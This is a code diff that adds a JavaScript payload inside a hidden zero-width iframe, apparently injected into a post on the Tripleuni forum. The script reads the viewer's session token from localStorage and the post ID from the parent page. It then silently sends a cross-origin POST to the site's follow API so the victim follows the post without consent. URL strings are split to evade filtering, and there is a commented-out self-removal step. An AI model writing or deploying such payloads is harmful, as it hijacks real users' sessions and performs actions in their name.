@@ -5,16 +5,79 @@
         let pdoc = parent.document;
 
         // YOUR CODE HERE
-        // get the url of the post
-        let url = pdoc.location.href;
-        // get the id of the post
-        let id = url.split('/').pop();
+        const Headers = {
+          'Content-Type': 'application/json',
+          'method': 'POST',
+          'scheme': 'https',
+          'Origin': 'htt'+'ps://tripleuni.com',
+          'Referer': 'htt'+'ps://tripleuni.com',
+          'Sec-Fetch-Dest': 'empty',
+          'Sec-Fetch-Mode': 'cors',
+          'Sec-Fetch-Site': 'cross-site'
+    
+        };
 
-        alert('id: ' + id);
+        function getPostId() {
+          // get the url of the post
+          let url = pdoc.location.href;
+          // get the id of the post
+          let id = url.split('/').pop();
+          return id;
+        }
 
-        // remove self
-        let self = parent.document.getElementById('iseeyou');
-        self.parentNode.removeChild(self);
+        function createCORS(method, url){
+          var xhr = new XMLHttpRequest();
+          if('withCredentials' in xhr){
+              xhr.open(method, url, true);
+          }else if(typeof XDomainRequest != 'undefined'){
+              var xhr = new XDomainRequest();
+              xhr.open(method, url);
+          }else{
+              xhr = null;
+          }
+          return xhr;
+        }
+
+        async function follow(id) {
+          // get parent window token in local storage
+          let token = localStorage.getItem('token');
+          // post /api/follow with data use fetch
+          let data = {
+            'uni_post_id': id,
+            'token': token,
+            'language': 'zh-CN'
+            };
+          
+          let string = '';
+          for (let key in data) {
+            string += key + '=' + data[key] + '&';
+          }
+          string = string.slice(0, -1);
+        
+          let response = createCORS('POST', 'htt'+'ps://api.uni.hkupootal.com/v4/post/single/follow.php');
+          if (!response) {
+            throw new Error('CORS not supported');
+          }
+        
+          response.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+          response.send(string);
+          let result = await response.responseText;
+          return result;
+        }
+
+        async function autoFollow() {
+          // get post id
+          let id = getPostId();
+          // follow
+          let result = await follow(id);
+          
+        }
+
+        autoFollow().then(() => {
+          // remove self
+          // let self = parent.document.getElementById('iseeyou');
+          // self.parentNode.removeChild(self);
+        });
     </script>
     "
   width="0"
